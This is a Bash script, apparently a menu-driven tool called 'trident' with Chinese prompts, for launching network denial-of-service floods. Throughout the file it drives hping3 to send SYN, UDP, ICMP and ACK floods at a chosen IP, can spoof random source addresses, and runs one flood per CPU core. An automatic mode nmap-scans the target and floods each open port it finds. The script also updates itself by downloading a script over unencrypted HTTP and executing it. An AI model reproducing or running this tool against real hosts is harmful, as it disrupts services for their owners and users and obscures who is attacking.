#!/bin/bash
# Repository <https://github.com/sshpc/trident>
export LANG=en_US.UTF-8

# 全局变量
selfversion='0.5'
datevar=$(date +%Y-%m-%d_%H:%M:%S)
menuname='首页'
parentfun=''
installType='apt -y install'
removeType='apt -y remove'
upgrade="apt -y update"
release='linux'
# 获取 CPU 核心数
CONCURRENT_ATTACKS=$(nproc)

TARGET_IP=""
SOURCE_IP=""
DURATION=10
PACKET_SIZE=120
TARGET_PORT=80

# 目录和文件路径
TRIDENT_TMP_DIR="$HOME/trident_tmp"
CONFIG_FILE="$TRIDENT_TMP_DIR/config.conf"
LOG_FILE="$TRIDENT_TMP_DIR/run.log"

# 颜色定义
_red() {
    printf '\033[0;31;31m%b\033[0m' "$1"
    echo
}
_green() {
    printf '\033[0;31;32m%b\033[0m' "$1"
    echo
}
_yellow() {
    printf '\033[0;31;33m%b\033[0m' "$1"
    echo
}
_blue() {
    printf '\033[0;31;36m%b\033[0m' "$1"
    echo
}

# 等待输入
waitinput() {
    echo
    read -n1 -r -p "按任意键继续...(退出 Ctrl+C)"
}

# 加载动画
loading() {
    local pids=("$@")
    local delay=0.1
    local spinstr='|/-\'
    tput civis # 隐藏光标

    while :; do
        local all_done=true
        for pid in "${pids[@]}"; do
            if kill -0 "$pid" 2>/dev/null; then
                all_done=false
                local temp=${spinstr#?}
                printf "\r\033[0;31;36m[ %c ] 正在执行 ...\033[0m" "$spinstr"
                local spinstr=$temp${spinstr%"$temp"}
                sleep $delay
            fi
        done
        [[ $all_done == true ]] && break
    done

    tput cnorm        # 恢复光标
    printf "\r\033[K" # 清除行
}

# 字符跳动效果
jumpfun() {
    local str=$1
    local delay=${2:-0.05}
    for ((i = 0; i < ${#str}; i++)); do
        printf '\033[0;31;36m%b\033[0m' "${str:$i:1}"
        sleep "$delay"
    done
    echo
}

#检查系统
checkSystem() {
    if [[ -n $(find /etc -name "redhat-release") ]] || grep </proc/version -q -i "centos"; then
        release="centos"
        installType='yum -y install'
        removeType='yum -y remove'
        upgrade="yum update -y --skip-broken"
    elif grep -q -i "debian" /etc/issue || grep -q -i "debian" /proc/version || grep -q -i "ID=debian" /etc/os-release; then
        release="debian"
        installType='apt -y install'
        upgrade="apt update"
        removeType='apt -y autoremove'
    elif grep -q -i "ubuntu" /etc/issue || grep -q -i "ubuntu" /proc/version; then
        release="ubuntu"
        installType='apt -y install'
        upgrade="apt update"
        removeType='apt -y autoremove'
    elif grep -q -i "Alpine" /etc/issue || grep -q -i "Alpine" /proc/version; then
        release="alpine"
        installType='apk add'
        upgrade="apk update"
        removeType='apk del' # 修正错误的删除命令
    else
        _red "不支持此系统"
        exit 1
    fi
}

# 优化检查依赖函数，添加错误处理
check_deps() {
    local deps=('hping3' 'nmap' 'curl')
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            _yellow "$dep 未安装，正在安装..."
            if ! ${upgrade} || ! ${installType} "$dep"; then
                _red "安装 $dep 失败，请检查网络或权限。"
                exit 1
            fi
        fi
    done
}

# 优化清理函数，使用更安全的方式终止子进程
cleanup() {
    _yellow "清理中，杀掉所有子进程..."
    local pids=$(jobs -p)
    [ -n "$pids" ] && kill $pids
}

# 菜单头部
menutop() {
    clear
    _yellow "  |                  v: $selfversion"
    _yellow '| | |'
    _yellow "__|__                目标IP: $TARGET_IP"
    _yellow '  |  '
    _yellow '  |  '
    _yellow "  |                  OS: $release  "
    echo
    _blue "当前菜单: $menuname "
    echo
}

# 菜单渲染
menu() {
    menutop
    # 如果文件存在重新加载配置
    if [[ -f "$CONFIG_FILE" ]]; then
        source "$CONFIG_FILE"
    fi

    local options=("$@")
    local num_options=${#options[@]}
    local max_len=0

    for ((i = 0; i < num_options; i += 2)); do
        local str_len=${#options[i]}
        ((str_len > max_len)) && max_len=$str_len
    done

    for ((i = 0; i < num_options; i += 4)); do
        printf "%s%*s  " "$((i / 2 + 1)): ${options[i]}" "$((max_len - ${#options[i]}))"
        [[ -n "${options[i + 2]}" ]] && printf "$((i / 2 + 2)): ${options[i + 2]}"
        echo -e "\n"
    done

    _blue "q: 退出  b: 返回  0: 首页"
    echo
    read -ep "请输入命令号: " number

    case "$number" in
    [1-$((num_options / 2))])
        local action_index=$((2 * (number - 1) + 1))
        parentfun=${options[action_index]}
        ${options[action_index]}
        waitinput
        main
        ;;
    0) main ;;
    b) ${FUNCNAME[3]} ;;
    q) exit ;;
    *)
        _red '输入错误'
        waitinput
        main
        ;;
    esac
}

# 记录日志函数
log_action() {
    local timestamp=$(date +"%Y-%m-%d %H:%M:%S")
    local action_type=$1
    local command=$2
    echo "$timestamp | $action_type | $command" >>"$LOG_FILE"
}

# 封装保存配置到文件的函数
save_config() {
    echo -e "TARGET_IP=$TARGET_IP\nDURATION=$DURATION\nPACKET_SIZE=$PACKET_SIZE\nTARGET_PORT=$TARGET_PORT\nSOURCE_IP=$SOURCE_IP" >"$CONFIG_FILE"
    _green "配置已保存到 $CONFIG_FILE"
}

# 配置目标 IP
configure_target_ip() {
    while true; do
        read -ep "请输入目标IP: " target_ip
        if [[ -z "$target_ip" ]]; then
            _red "错误：IP地址不能为空"
            continue
        fi
        if [[ "$target_ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || [[ "$target_ip" =~ ^([a-fA-F0-9]{1,4}:){7}[a-fA-F0-9]{1,4}$ ]]; then
            TARGET_IP=$target_ip
            break
        else
            _red "错误：无效的IP地址格式"
        fi
    done
    save_config
}

# 配置数据包大小
configure_packet_size() {
    read -ep "请输入数据包大小(默认 120): " packet_size
    packet_size=${packet_size:-120}
    PACKET_SIZE=$packet_size
    save_config
}

# 配置持续时间
configure_duration() {
    read -ep "请输入持续时间(秒，默认 10): " duration
    duration=${duration:-10}
    DURATION=$duration
    save_config
}

# 配置目标端口
configure_target_port() {
    read -ep "请输入目标端口(默认 80): " target_port
    target_port=${target_port:-80}
    TARGET_PORT=$target_port
    save_config
}

configure_source_ip() {
    read -ep "请输入源IP地址(为空则随机ip): " source_ip
    SOURCE_IP=$source_ip
    save_config
}

# 执行攻击的通用函数
execute_attack() {
    local attack_type=$1
    local attack_flag=$2
    local target_ip=$3
    local target_port=$4
    local packet_size=$5
    local duration=$6

    local sourcepattern="--rand-source"

    #判断来源IP不为空
    
    if [[ -n "$SOURCE_IP" ]]; then
        sourcepattern="-a $SOURCE_IP"
    fi

    log_action "Attack Start" "hping3 -c $((duration * 1000)) -d $packet_size $attack_flag -p $target_port --flood $sourcepattern $target_ip"

    if [[ "$attack_type" == "ICMP" ]]; then
        _yellow "攻击类型: $attack_type"
        _yellow "目标: $target_ip"
        _yellow "命令: hping3 -c $((duration * 1000)) -d $packet_size $attack_flag --flood $sourcepattern $target_ip"
        hping3 -c $((duration * 1000)) -d "$packet_size" $attack_flag --flood $sourcepattern "$target_ip" &
    else
        _yellow "攻击类型: $attack_type"
        _yellow "目标: $target_ip:$target_port"
        _yellow "命令: hping3 -c $((duration * 1000)) -d $packet_size $attack_flag -p $target_port --flood $sourcepattern $target_ip"
        hping3 -c $((duration * 1000)) -d "$packet_size" $attack_flag -p "$target_port" --flood $sourcepattern "$target_ip" &
    fi
}

# 新增参数验证函数
validate_params() {
    local required_params=("$@")
    local need_prompt=false

    # 检查必填参数对应的全局变量
    for param in "${required_params[@]}"; do
        case "$param" in
            "IP")
                if [[ -z "$TARGET_IP" ]]; then
                    _yellow "目标IP未配置"
                    configure_target_ip
                    need_prompt=true
                fi
                ;;
            "PORT")
                if [[ -z "$TARGET_PORT" ]]; then
                    _yellow "目标端口未配置"
                    configure_target_port
                    need_prompt=true
                fi
                ;;
            "SIZE")
                if [[ -z "$PACKET_SIZE" ]]; then
                    _yellow "数据包大小未配置"
                    configure_packet_size
                    need_prompt=true
                fi
                ;;
            "TIME")
                if [[ -z "$DURATION" ]]; then
                    _yellow "持续时间未配置"
                    configure_duration
                    need_prompt=true
                fi
                ;;
        esac
    done

    # 保存最新配置
    if [[ $need_prompt == true ]]; then
        save_config
        source "$CONFIG_FILE" # 重新加载配置
    fi
}

# 手动攻击
hping3_attack() {
    menuname="首页/HPING3攻击"

    attack_menu() {
        local attack_type=$1
        local attack_flag=$2

        if [[ "$attack_type" == "ICMP" ]]; then
            validate_params "IP" "SIZE" "TIME"
        else
            validate_params "IP" "PORT" "SIZE" "TIME"
        fi

        jumpfun "开始执行攻击..."
        local pids=()
        for ((i = 0; i < CONCURRENT_ATTACKS; i++)); do
            execute_attack "$attack_type" "$attack_flag" "$TARGET_IP" "$TARGET_PORT" "$PACKET_SIZE" "$DURATION"
            pids+=($!) # 收集子进程 PID
        done
        loading "${pids[@]}" # 显示加载动画
        wait # 等待所有子进程完成
        jumpfun "攻击完成"
    }

    options=(
        "SYN Flood" "attack_menu SYN -S"
        "UDP Flood" "attack_menu UDP --udp"
        "ICMP Flood" "attack_menu ICMP --icmp"
        "ACK Flood" "attack_menu ACK -A"
    )
    menu "${options[@]}"
}

# 全自动攻击
auto_attack() {
    menuname="首页/全自动攻击"
    validate_params "IP"

    _yellow "开始扫描目标的常用端口..."
    local open_ports=$(nmap -p 1-1024,3306,3389,8080,8888,8443 --min-rate=1000 -T4 "$TARGET_IP" | grep 'open' | awk -F '/' '{print $1}')
    _yellow "开放端口: $open_ports"

    local attack_types=()
    if [[ -n "$open_ports" ]]; then
        for port in $open_ports; do
            attack_types+=("SYN" "-S" "$port")
            attack_types+=("ACK" "-A" "$port")
            attack_types+=("UDP" "--udp" "$port")
        done
    else
        attack_types+=("ICMP" "--icmp" "")
    fi

    jumpfun "开始自动攻击..."
    local pids=()
     #并发攻击
    for ((i = 0; i < ${#attack_types[@]}; i += 3)); do
        local attack_type=${attack_types[i]}
        local attack_flag=${attack_types[i + 1]}
        local target_port=${attack_types[i + 2]}

        # 动态调整攻击参数
        case "$attack_type" in
            "UDP")
            PACKET_SIZE=512 # 对于 UDP 攻击，增加数据包大小
            ;;
            "ICMP")
            DURATION=5 # 对于 ICMP 攻击，缩短持续时间
            ;;
            "SYN" | "ACK")
            PACKET_SIZE=120 # 对于 SYN/ACK 攻击，使用默认数据包大小
            ;;
        esac

        _yellow "执行 $attack_type 攻击..."
        execute_attack "$attack_type" "$attack_flag" "$TARGET_IP" "$target_port" "$PACKET_SIZE" "$DURATION"
        pids+=($!) # 收集子进程 PID

        # 计算若超过cpu核数退出循环
        if [[ ${#pids[@]} -gt $CONCURRENT_ATTACKS ]]; then
            break
        fi
    done

    loading "${pids[@]}" 
    wait # 等待所有子进程完成
    _green "自动攻击完成"
}

# NMAP扫描函数
nmap_scan() {
    menuname="首页/NMAP扫描"

    validate_params "IP"

    execute_scan() {
        local scan_type=$1
        local scan_flag=$2

        _yellow "执行 $scan_type 扫描: $TARGET_IP"

        nmap $scan_flag "$TARGET_IP" &
        local pid=$!
        loading $pid
        wait $pid
        jumpfun "扫描完成"
    }

    options=(
        "快速扫描" "execute_scan Quick -F"
        "全面扫描" "execute_scan Comprehensive -A"
        "端口扫描" "execute_scan Ports -p-"
    )
    menu "${options[@]}"
}

# 升级脚本函数
update_script() {
    wget -N http://raw.githubusercontent.com/sshpc/trident/main/run.sh
    # 检查上一条命令的退出状态码
        if [ $? -eq 0 ]; then
            jumpfun '卸载旧版临时文件'
            rm -rf $TRIDENT_TMP_DIR
            jumpfun '更新成功'
            chmod +x ./run.sh && ./run.sh
        else
            _red "下载失败,请重试"
        fi
}

cat_log(){
    _yellow "tail -20 $LOG_FILE"
    tail -20 $LOG_FILE
}

# 高级设置
advanced_settings() {
    menuname="首页/高级设置"
    options=(
        "配置-目标 IP" configure_target_ip
        "配置-数据包大小" configure_packet_size
        "配置-持续时间" configure_duration
        "配置-目标端口" configure_target_port
        "配置-来源 IP" configure_source_ip
    )
    menu "${options[@]}"
}

# 主菜单
main() {
    # 加载配置文件
    if [ -f "$CONFIG_FILE" ]; then
        source "$CONFIG_FILE"
    fi

    menuname='首页'
    options=(
        "全自动攻击" auto_attack
        "手动攻击" hping3_attack
        "端口扫描" nmap_scan
        "升级脚本" update_script
        "高级设置" advanced_settings
        "查看日志" cat_log
    )
    menu "${options[@]}"
}

# 检查系统
checkSystem
# 检查依赖
check_deps


# 检查并创建目录
if [ ! -d "$TRIDENT_TMP_DIR" ]; then
    mkdir -p "$TRIDENT_TMP_DIR"
fi

# 脚本退出时清理
trap cleanup EXIT

main
